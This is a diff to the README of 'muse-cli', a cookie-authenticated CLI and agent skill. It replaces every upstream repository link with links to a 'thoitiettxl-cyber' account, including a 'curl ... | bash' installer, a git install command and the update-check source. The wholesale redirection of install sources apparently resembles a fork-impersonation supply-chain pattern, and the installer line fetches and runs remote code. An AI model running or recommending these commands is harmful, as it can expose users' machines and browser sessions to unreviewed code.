@@ -30,12 +30,12 @@ Prompt a coding agent, it activates the muse-cli skill and runs read-only
 commands for you. Live session below: a Droid worker runs `muse-cli status`
 and `muse-cli goals`, then reports back.
 
-![Droid agent using muse-cli to check status and goals](https://raw.githubusercontent.com/nikships/muse-cli/main/assets/demo-agent.png)
+![Droid agent using muse-cli to check status and goals](https://raw.githubusercontent.com/thoitiettxl-cyber/muse-cli/main/assets/demo-agent.png)
 
 ## Quick Start
 
 ```bash
-uv tool install muse-cli      # or: pipx install muse-cli   /   pip install muse-cli
+uv tool install git+https://github.com/thoitiettxl-cyber/muse-cli.git   # or: pipx install git+https://github.com/thoitiettxl-cyber/muse-cli.git
 ```
 
 The command is `muse-cli`. The name `muse` belongs to Muse Code on many machines.
@@ -44,10 +44,10 @@ Want the agent skill too? The installer sets up the CLI and copies the skill
 to `~/.agents/skills/muse-cli`:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/nikships/muse-cli/main/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/thoitiettxl-cyber/muse-cli/main/install.sh | bash
 ```
 
-Upgrade with `muse-cli update`. In a terminal it also checks PyPI once a day and, when a newer release exists, prints that command on stderr. It does not upgrade itself. Set `MUSE_NO_UPDATE_CHECK=1` to silence the notice. The check stays quiet when output is piped or `CI` is set. Remove with `uv tool uninstall muse-cli`.
+Upgrade with `muse-cli update`. In a terminal it also checks the fork's main branch once a day and, when a newer version exists, prints that command on stderr. It does not upgrade itself. Set `MUSE_NO_UPDATE_CHECK=1` to silence the notice. The check stays quiet when output is piped or `CI` is set. Remove with `uv tool uninstall muse-cli`.
 
 Logging in is a separate one-time step. Chrome shares its cookies after you
 turn on remote debugging. Follow [Log in once](#log-in-once) before running
@@ -222,11 +222,11 @@ Agents: never poll `history` in a sleep loop; use `send --until-done` or a backg
 
 ## How it works
 
-![how muse-cli connects](https://raw.githubusercontent.com/nikships/muse-cli/main/assets/how-it-works.webp)
+![how muse-cli connects](https://raw.githubusercontent.com/thoitiettxl-cyber/muse-cli/main/assets/how-it-works.webp)
 
-![muse-cli connection flow](https://raw.githubusercontent.com/nikships/muse-cli/main/assets/flow.webp)
+![muse-cli connection flow](https://raw.githubusercontent.com/thoitiettxl-cyber/muse-cli/main/assets/flow.webp)
 
-See [docs/PROTOCOL.md](https://github.com/nikships/muse-cli/blob/main/docs/PROTOCOL.md)
+See [docs/PROTOCOL.md](https://github.com/thoitiettxl-cyber/muse-cli/blob/main/docs/PROTOCOL.md)
 for the full protocol notes, including the method table and the server quirks
 found during reverse engineering.
 
@@ -234,15 +234,15 @@ found during reverse engineering.
 
 | Resource | Description |
 |----------|-------------|
-| [skills/muse-cli/SKILL.md](https://github.com/nikships/muse-cli/blob/main/skills/muse-cli/SKILL.md) | Agent skill: install check, auth setup, command reference |
-| [docs/PROTOCOL.md](https://github.com/nikships/muse-cli/blob/main/docs/PROTOCOL.md) | Gateway protocol reference: auth chain, Noise transport, framing, method quirks |
-| [routes.json](https://github.com/nikships/muse-cli/blob/main/src/muse_cli/routes.json) | All 258 gateway methods with paths and services |
+| [skills/muse-cli/SKILL.md](https://github.com/thoitiettxl-cyber/muse-cli/blob/main/skills/muse-cli/SKILL.md) | Agent skill: install check, auth setup, command reference |
+| [docs/PROTOCOL.md](https://github.com/thoitiettxl-cyber/muse-cli/blob/main/docs/PROTOCOL.md) | Gateway protocol reference: auth chain, Noise transport, framing, method quirks |
+| [routes.json](https://github.com/thoitiettxl-cyber/muse-cli/blob/main/src/muse_cli/routes.json) | All 258 gateway methods with paths and services |
 | `muse-cli raw --help` | Escape hatch for calling any gateway method directly |
 
 ## Development
 
 ```bash
-git clone https://github.com/nikships/muse-cli.git
+git clone https://github.com/thoitiettxl-cyber/muse-cli.git
 cd muse-cli
 uv run muse-cli --help
 uv run python -m unittest discover -s tests   # unit tests (no network)
